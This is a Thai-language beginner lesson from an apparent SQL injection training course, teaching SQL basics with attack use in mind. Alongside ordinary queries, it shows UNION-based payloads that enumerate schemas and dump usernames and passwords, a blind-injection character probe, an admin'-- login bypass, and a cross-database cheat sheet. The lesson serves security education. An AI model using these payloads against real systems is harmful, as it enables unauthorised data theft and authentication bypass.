# Part 002: SQL Fundamentals
## พื้นฐาน SQL ที่จำเป็นสำหรับการเรียนรู้ SQL Injection

**ระดับ:** ⭐ Beginner  
**เวลาที่ใช้เรียน:** 3-4 ชั่วโมง  
**Prerequisites:** Part 001

---

## 🎯 วัตถุประสงค์การเรียนรู้ (Learning Objectives)

เมื่อเรียนจบบทนี้ ผู้เรียนจะสามารถ:
1. เขียนคำสั่ง SELECT, INSERT, UPDATE, DELETE ได้
2. ใช้ WHERE Clause ร่วมกับ Operators ต่างๆ
3. เข้าใจ String Functions และ Aggregate Functions
4. เข้าใจ JOIN Operations
5. ใช้ Subqueries ได้
6. เข้าใจ UNION Operations (สำคัญมากสำหรับ SQL Injection)

---

## 1. SQL คืออะไร? (What is SQL?)

**SQL (Structured Query Language)** คือภาษาที่ใช้สำหรับการจัดการและสืบค้นข้อมูลในระบบฐานข้อมูลเชิงสัมพันธ์ (Relational Database Management System - RDBMS)

### ประวัติโดยย่อ

```
1970 - Edgar F. Codd เสนอแนวคิด Relational Model
1974 - IBM พัฒนา SEQUEL (Structured English Query Language)
1979 - Oracle เปิดตัว Commercial SQL Database แห่งแรก
1986 - ANSI/ISO กำหนดมาตรฐาน SQL-86
ปัจจุบัน - SQL ยังคงเป็นมาตรฐานสำหรับ Relational Databases
```

### ระบบฐานข้อมูลที่นิยม

```
┌─────────────────┬──────────────────────────────────────┐
│ Database        │ ลักษณะเด่น                            │
├─────────────────┼──────────────────────────────────────┤
│ MySQL           │ Open-source, นิยมมากใน Web Dev        │
│ PostgreSQL      │ Open-source, Feature-rich, Standards  │
│ Microsoft SQL   │ Enterprise, Windows Integration        │
│ Server (MSSQL)  │                                       │
│ Oracle          │ Enterprise, Performance, Reliability   │
│ SQLite          │ Embedded, Lightweight, File-based      │
│ MariaDB         │ MySQL Fork, Open-source                │
└─────────────────┴──────────────────────────────────────┘
```

---

## 2. Database Structure พื้นฐาน (Basic Database Structure)

### แนวคิดหลัก

```
Database (ฐานข้อมูล)
└── Tables (ตาราง)
    ├── Columns/Fields (คอลัมน์/ฟิลด์)
    │   ├── Column Name (ชื่อคอลัมน์)
    │   ├── Data Type (ประเภทข้อมูล)
    │   └── Constraints (ข้อจำกัด)
    └── Rows/Records (แถว/เรคคอร์ด)
```

### ตัวอย่าง Table

```sql
-- ตาราง users ที่เราจะใช้ตลอดหลักสูตร
CREATE TABLE users (
    id          INT          PRIMARY KEY AUTO_INCREMENT,
    username    VARCHAR(50)  NOT NULL UNIQUE,
    password    VARCHAR(255) NOT NULL,
    email       VARCHAR(100) NOT NULL,
    role        ENUM('admin', 'user', 'moderator') DEFAULT 'user',
    created_at  DATETIME     DEFAULT CURRENT_TIMESTAMP,
    is_active   BOOLEAN      DEFAULT TRUE
);

-- ตาราง products
CREATE TABLE products (
    id          INT          PRIMARY KEY AUTO_INCREMENT,
    name        VARCHAR(200) NOT NULL,
    description TEXT,
    price       DECIMAL(10,2) NOT NULL,
    category_id INT,
    stock       INT          DEFAULT 0,
    created_at  DATETIME     DEFAULT CURRENT_TIMESTAMP
);

-- ตาราง orders
CREATE TABLE orders (
    id          INT          PRIMARY KEY AUTO_INCREMENT,
    user_id     INT          NOT NULL,
    total_price DECIMAL(10,2) NOT NULL,
    status      VARCHAR(50)  DEFAULT 'pending',
    created_at  DATETIME     DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

### Data Types ที่สำคัญ

```sql
-- ประเภทข้อมูลที่พบบ่อย
INT         -- จำนวนเต็ม: 1, 2, 100, -5
VARCHAR(n)  -- ข้อความความยาวแปรผัน: 'hello', 'admin'
TEXT        -- ข้อความยาวมาก: บทความ, คำอธิบาย
DECIMAL     -- ทศนิยม: 9.99, 1234.56
DATETIME    -- วันและเวลา: '2024-01-15 10:30:00'
DATE        -- วันที่: '2024-01-15'
BOOLEAN     -- จริง/เท็จ: TRUE, FALSE, 1, 0
ENUM        -- รายการค่าที่กำหนด: ENUM('admin','user')
```

---

## 3. SELECT Statement (การสืบค้นข้อมูล)

### Syntax พื้นฐาน

```sql
SELECT column1, column2, ...
FROM table_name
WHERE condition
ORDER BY column
LIMIT number;
```

### ตัวอย่าง SELECT

```sql
-- Select ทุก Column
SELECT * FROM users;

-- Select เฉพาะ Column ที่ต้องการ
SELECT username, email FROM users;

-- Select พร้อม Alias
SELECT username AS "ชื่อผู้ใช้", email AS "อีเมล" FROM users;

-- Select ด้วยเงื่อนไข
SELECT * FROM users WHERE role = 'admin';

-- Select ด้วยหลายเงื่อนไข
SELECT * FROM users WHERE role = 'admin' AND is_active = TRUE;

-- Select แบบเรียงลำดับ
SELECT * FROM users ORDER BY created_at DESC;

-- Select พร้อม Limit
SELECT * FROM users LIMIT 10;

-- Select พร้อม Limit และ Offset
SELECT * FROM users LIMIT 10 OFFSET 20;  -- Skip 20 แถวแรก, เอา 10 แถวถัดไป

-- Count จำนวนแถว
SELECT COUNT(*) FROM users;
SELECT COUNT(*) AS total_users FROM users WHERE is_active = TRUE;

-- Select Distinct (ไม่ซ้ำ)
SELECT DISTINCT role FROM users;
```

### WHERE Clause และ Operators

```sql
-- Comparison Operators
SELECT * FROM products WHERE price > 100;         -- มากกว่า
SELECT * FROM products WHERE price >= 100;        -- มากกว่าหรือเท่ากับ
SELECT * FROM products WHERE price < 100;         -- น้อยกว่า
SELECT * FROM products WHERE price <= 100;        -- น้อยกว่าหรือเท่ากับ
SELECT * FROM products WHERE price = 99.99;       -- เท่ากับ
SELECT * FROM products WHERE price != 99.99;      -- ไม่เท่ากับ
SELECT * FROM products WHERE price <> 99.99;      -- ไม่เท่ากับ (อีกรูปแบบ)

-- Logical Operators
SELECT * FROM users WHERE role = 'admin' AND is_active = TRUE;
SELECT * FROM users WHERE role = 'admin' OR role = 'moderator';
SELECT * FROM users WHERE NOT (role = 'user');

-- BETWEEN
SELECT * FROM products WHERE price BETWEEN 50 AND 200;

-- IN
SELECT * FROM users WHERE role IN ('admin', 'moderator');

-- LIKE (Pattern Matching)
SELECT * FROM users WHERE username LIKE 'admin%';   -- เริ่มต้นด้วย admin
SELECT * FROM users WHERE email LIKE '%@gmail.com'; -- ลงท้ายด้วย @gmail.com
SELECT * FROM users WHERE username LIKE '%admin%';  -- มีคำว่า admin

-- IS NULL / IS NOT NULL
SELECT * FROM products WHERE description IS NULL;
SELECT * FROM products WHERE description IS NOT NULL;
```

---

## 4. INSERT Statement (การเพิ่มข้อมูล)

```sql
-- Insert แบบระบุทุก Column
INSERT INTO users (username, password, email, role) 
VALUES ('john_doe', 'hashedpassword123', 'john@example.com', 'user');

-- Insert หลายแถวในครั้งเดียว
INSERT INTO users (username, password, email) VALUES 
('alice', 'hash1', 'alice@example.com'),
('bob', 'hash2', 'bob@example.com'),
('charlie', 'hash3', 'charlie@example.com');

-- Insert ข้อมูลจาก SELECT
INSERT INTO admins (username, email)
SELECT username, email FROM users WHERE role = 'admin';
```

---

## 5. UPDATE Statement (การแก้ไขข้อมูล)

```sql
-- Update ข้อมูล
UPDATE users SET password = 'newhashedpassword' WHERE username = 'john_doe';

-- Update หลาย Column
UPDATE users 
SET password = 'newpass', 
    email = 'newemail@example.com',
    is_active = FALSE
WHERE id = 5;

-- Update ด้วยเงื่อนไขซับซ้อน
UPDATE products 
SET price = price * 0.9  -- ลด 10%
WHERE category_id = 3 AND stock > 100;

-- ⚠️ อันตราย: Update โดยไม่มี WHERE จะแก้ไขทุกแถว!
UPDATE users SET password = 'hacked';  -- แก้ไข Password ทุก User!
```

---

## 6. DELETE Statement (การลบข้อมูล)

```sql
-- Delete ข้อมูลตามเงื่อนไข
DELETE FROM users WHERE id = 5;

-- Delete หลายแถว
DELETE FROM users WHERE is_active = FALSE;

-- Delete ด้วยเงื่อนไขซับซ้อน
DELETE FROM orders 
WHERE status = 'cancelled' 
AND created_at < '2023-01-01';

-- ⚠️ อันตรายมาก: Delete โดยไม่มี WHERE จะลบทุกแถว!
DELETE FROM users;  -- ลบทุก User!

-- DROP vs DELETE
TRUNCATE TABLE temp_logs;  -- ลบทุกแถว รีเซ็ต Auto Increment
DROP TABLE temp_logs;       -- ลบทั้งตาราง
```

---

## 7. String Functions (ฟังก์ชันสำหรับข้อความ)

ฟังก์ชันเหล่านี้สำคัญมากสำหรับการทำ SQL Injection:

```sql
-- ความยาวของ String
SELECT LENGTH('Hello World');        -- 11
SELECT LEN('Hello World');           -- MSSQL syntax

-- ตัดช่องว่าง
SELECT TRIM('  hello  ');            -- 'hello'
SELECT LTRIM('  hello  ');           -- 'hello  '
SELECT RTRIM('  hello  ');           -- '  hello'

-- ตัวพิมพ์ใหญ่/เล็ก
SELECT UPPER('hello');               -- 'HELLO'
SELECT LOWER('HELLO');               -- 'hello'

-- ดึงส่วนของ String
SELECT SUBSTRING('Hello World', 1, 5);  -- 'Hello'
SELECT SUBSTR('Hello World', 7);        -- 'World'
SELECT LEFT('Hello World', 5);          -- 'Hello'
SELECT RIGHT('Hello World', 5);         -- 'World'
SELECT MID('Hello World', 1, 5);        -- 'Hello' (MySQL)

-- ต่อ String
SELECT CONCAT('Hello', ' ', 'World');   -- 'Hello World'
SELECT 'Hello' || ' ' || 'World';       -- PostgreSQL/Oracle

-- หาตำแหน่งของ String
SELECT INSTR('Hello World', 'World');   -- 7 (MySQL/Oracle)
SELECT POSITION('World' IN 'Hello World');  -- 7
SELECT CHARINDEX('World', 'Hello World');   -- MSSQL

-- แทนที่ String
SELECT REPLACE('Hello World', 'World', 'SQL');  -- 'Hello SQL'

-- ตัวอย่างสำหรับ SQL Injection (MySQL)
-- ใช้ CONCAT เพื่อรวมข้อมูล
SELECT CONCAT(username, ':', password) FROM users;

-- GROUP_CONCAT รวมหลายแถวเป็น String เดียว
SELECT GROUP_CONCAT(username SEPARATOR ', ') FROM users;
-- ผล: 'admin, john, alice, bob'

-- ASCII และ CHAR (ใช้ใน Blind SQL Injection)
SELECT ASCII('A');                   -- 65
SELECT CHAR(65);                     -- 'A'

-- ตัวอย่างใช้ใน Blind Injection:
-- ตรวจสอบว่าตัวอักษรแรกของ username คือ 'a' หรือไม่
SELECT * FROM users WHERE ASCII(SUBSTRING(username, 1, 1)) = 97;
```

---

## 8. Numeric Functions (ฟังก์ชันตัวเลข)

```sql
-- ปัดเศษ
SELECT ROUND(9.567, 2);      -- 9.57
SELECT FLOOR(9.9);           -- 9 (ปัดลง)
SELECT CEILING(9.1);         -- 10 (ปัดขึ้น)

-- ค่าสัมบูรณ์
SELECT ABS(-10);             -- 10

-- Power/Square Root
SELECT POW(2, 10);           -- 1024
SELECT SQRT(144);            -- 12

-- Random (ใช้ใน Time-Based SQL Injection)
SELECT RAND();               -- ค่าสุ่ม 0-1
SELECT FLOOR(RAND() * 100);  -- จำนวนสุ่ม 0-99
```

---

## 9. Date/Time Functions (ฟังก์ชันวันและเวลา)

```sql
-- วันเวลาปัจจุบัน
SELECT NOW();                -- '2024-01-15 10:30:00'
SELECT CURRENT_TIMESTAMP;   -- เหมือน NOW()
SELECT CURDATE();            -- '2024-01-15' (MySQL)
SELECT CURRENT_DATE;        -- '2024-01-15'
SELECT SYSDATE();            -- Oracle

-- แยกส่วนของวันเวลา
SELECT YEAR('2024-01-15');   -- 2024
SELECT MONTH('2024-01-15');  -- 1
SELECT DAY('2024-01-15');    -- 15

-- คำนวณวันเวลา
SELECT DATE_ADD('2024-01-15', INTERVAL 30 DAY);   -- 2024-02-14
SELECT DATEDIFF('2024-12-31', '2024-01-01');       -- 365
```

---

## 10. Aggregate Functions (ฟังก์ชันรวม)

```sql
-- COUNT: นับจำนวน
SELECT COUNT(*) FROM users;                         -- นับทุกแถว
SELECT COUNT(email) FROM users;                     -- นับ non-NULL
SELECT COUNT(DISTINCT role) FROM users;             -- นับค่าไม่ซ้ำ

-- SUM: รวม
SELECT SUM(price) FROM orders;                      -- รวมราคาทั้งหมด

-- AVG: ค่าเฉลี่ย
SELECT AVG(price) FROM products;                    -- ราคาเฉลี่ย

-- MIN/MAX: ค่าต่ำสุด/สูงสุด
SELECT MIN(price), MAX(price) FROM products;

-- GROUP BY: จัดกลุ่ม
SELECT role, COUNT(*) AS user_count 
FROM users 
GROUP BY role;

-- HAVING: กรองกลุ่ม (ใช้หลัง GROUP BY)
SELECT role, COUNT(*) AS user_count 
FROM users 
GROUP BY role
HAVING COUNT(*) > 5;
```

---

## 11. JOIN Operations (การรวมตาราง)

JOIN เป็นส่วนสำคัญที่ต้องเข้าใจสำหรับ SQL Injection:

```sql
-- INNER JOIN: เอาเฉพาะแถวที่มีค่าตรงกันทั้งสองตาราง
SELECT u.username, o.id, o.total_price, o.status
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: เอาทุกแถวจากตารางซ้าย แม้ไม่มีในตารางขวา
SELECT u.username, o.id, o.total_price
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- RIGHT JOIN: ตรงข้ามกับ LEFT JOIN
SELECT u.username, o.id, o.total_price
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;

-- CROSS JOIN: Cartesian Product (ทุก Combination)
SELECT u.username, p.name
FROM users u
CROSS JOIN products p;
```

---

## 12. UNION Operator (สำคัญมากสำหรับ SQL Injection!)

**UNION** คือหัวใจสำคัญของ UNION-Based SQL Injection ต้องเข้าใจให้ดี:

### กฎของ UNION
```sql
-- กฎสำคัญ:
-- 1. จำนวน Column ต้องเท่ากัน
-- 2. ประเภทข้อมูลต้องเข้ากันได้

-- ถูกต้อง: 2 columns ทั้งคู่
SELECT id, name FROM products
UNION
SELECT id, username FROM users;

-- ผิด: จำนวน column ไม่เท่ากัน
SELECT id, name, price FROM products
UNION
SELECT id, username FROM users;  -- ERROR!
```

### ตัวอย่างการใช้งานจริง (สำคัญมากสำหรับ SQLi!)

```sql
-- การค้นพบจำนวน Column (เทคนิค NULL)
-- ลองเพิ่ม NULL ทีละตัวจนไม่ Error:
SELECT * FROM products WHERE id = 1 UNION SELECT NULL;           -- Error ถ้า > 1 column
SELECT * FROM products WHERE id = 1 UNION SELECT NULL, NULL;     -- Error ถ้า > 2 columns
SELECT * FROM products WHERE id = 1 UNION SELECT NULL, NULL, NULL; -- ถ้าไม่ Error = 3 columns!

-- เมื่อรู้จำนวน column แล้ว ค้นหา Database Version:
SELECT * FROM products WHERE id = 1 UNION SELECT 1, version(), 3;

-- ดึงรายชื่อ Tables (MySQL):
SELECT * FROM products WHERE id = 1 
UNION SELECT 1, table_name, 3 FROM information_schema.tables 
WHERE table_schema = database();

-- ดึงรายชื่อ Columns ของตาราง users:
SELECT * FROM products WHERE id = 1 
UNION SELECT 1, column_name, 3 FROM information_schema.columns 
WHERE table_name = 'users';

-- ดึงข้อมูล username และ password:
SELECT * FROM products WHERE id = 1 
UNION SELECT 1, CONCAT(username, ':', password), 3 FROM users;
```

---

## 13. System Tables / Information Schema (สำคัญมากสำหรับ SQL Injection!)

### MySQL / MariaDB
```sql
-- ดูทุก Database
SELECT schema_name FROM information_schema.schemata;

-- ดูทุก Table ในฐานข้อมูลปัจจุบัน
SELECT table_name FROM information_schema.tables 
WHERE table_schema = database();

-- ดูทุก Column ในตาราง users
SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name = 'users';

-- ดู Version ของ MySQL
SELECT version();
SELECT @@version;

-- ดู Database ปัจจุบัน
SELECT database();

-- ดู User ของ MySQL
SELECT user();
SELECT current_user();
```

### PostgreSQL
```sql
-- ดูทุก Table
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- ดู Version
SELECT version();

-- ดู Current User
SELECT current_user;
SELECT session_user;

-- ดู Current Database
SELECT current_database();
```

### Microsoft SQL Server (MSSQL)
```sql
-- ดูทุก Database
SELECT name FROM sys.databases;

-- ดูทุก Table
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- ดู Version
SELECT @@VERSION;

-- ดู Current User
SELECT SYSTEM_USER;

-- ดู Current Database
SELECT DB_NAME();
```

### Oracle
```sql
-- ดูทุก Table
SELECT table_name FROM all_tables;

-- ดู Version
SELECT * FROM v$version;

-- ดู Current User
SELECT user FROM dual;
```

---

## 14. Comments ใน SQL (สำคัญมากสำหรับ SQL Injection!)

```sql
-- MySQL / MSSQL: Single-line comment
SELECT * FROM users -- WHERE password = 'required'
SELECT * FROM users # WHERE password = 'required'

/* Multi-line comment */
SELECT * FROM users /* WHERE password = 'required' */

-- ตัวอย่างการใช้ใน SQL Injection:
-- Input: admin'--
-- Query ที่สร้างขึ้น:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- ส่วน ' AND password='anything' ถูก Comment ออกไป!
```

---

## 15. SQL Injection Quick Reference

```
┌────────────────────────┬──────────────────┬──────────────────┬──────────────────┬──────────────────┐
│ Feature                │ MySQL            │ PostgreSQL       │ MSSQL            │ Oracle           │
├────────────────────────┼──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ String Concat          │ CONCAT(a,b)      │ a||b             │ a+b              │ a||b             │
│ Comment                │ -- or #          │ --               │ --               │ --               │
│ Version                │ @@version        │ version()        │ @@VERSION        │ v$version        │
│ Current DB             │ database()       │ current_database │ DB_NAME()        │ N/A              │
│ Current User           │ user()           │ current_user     │ SYSTEM_USER      │ USER             │
│ Sleep                  │ SLEEP(n)         │ pg_sleep(n)      │ WAITFOR DELAY    │ dbms_pipe...     │
│ If/Else                │ IF(cond,t,f)     │ CASE             │ CASE             │ CASE             │
│ Limit                  │ LIMIT n          │ LIMIT n          │ TOP n            │ ROWNUM <= n      │
└────────────────────────┴──────────────────┴──────────────────┴──────────────────┴──────────────────┘
```

---

## 📝 แบบฝึกหัด (Exercises)

### Exercise 1: SQL พื้นฐาน

```sql
-- สร้าง Database
CREATE DATABASE sqli_practice;
USE sqli_practice;

-- สร้างตาราง
CREATE TABLE employees (
    id         INT PRIMARY KEY AUTO_INCREMENT,
    name       VARCHAR(100) NOT NULL,
    department VARCHAR(50),
    salary     DECIMAL(10,2),
    hire_date  DATE
);

-- ใส่ข้อมูลทดสอบ
INSERT INTO employees (name, department, salary, hire_date) VALUES
('สมชาย ใจดี', 'IT', 75000.00, '2020-03-15'),
('สมหญิง รักงาน', 'HR', 55000.00, '2019-07-01'),
('วิชัย พัฒนา', 'IT', 90000.00, '2018-01-10'),
('มาลี สุขใจ', 'Finance', 65000.00, '2021-11-20'),
('ประยุทธ์ ขยัน', 'IT', 80000.00, '2022-05-15');
```

---

## 🔑 สรุปประเด็นสำคัญ (Key Takeaways)

```
1. SELECT, INSERT, UPDATE, DELETE คือคำสั่งหลักของ SQL

2. WHERE Clause ควบคุมว่าแถวใดจะถูกประมวลผล

3. UNION ต้องการจำนวน Column เท่ากันและ Type เข้ากันได้

4. information_schema เก็บข้อมูลโครงสร้างของ Database ทั้งหมด

5. Comment (-- หรือ #) ยกเลิกส่วนที่เหลือของ Query

6. SLEEP(), WAITFOR เป็น Function สำคัญใน Time-Based SQLi

7. ฟังก์ชัน String เช่น SUBSTRING(), CHAR(), ASCII() ใช้ใน Blind SQLi
```

---

## ➡️ ถัดไป (Next Part)

**Part 003: Database Architecture**

---

*Part 002 | SQL Injection Mastery Course | Security Education Only*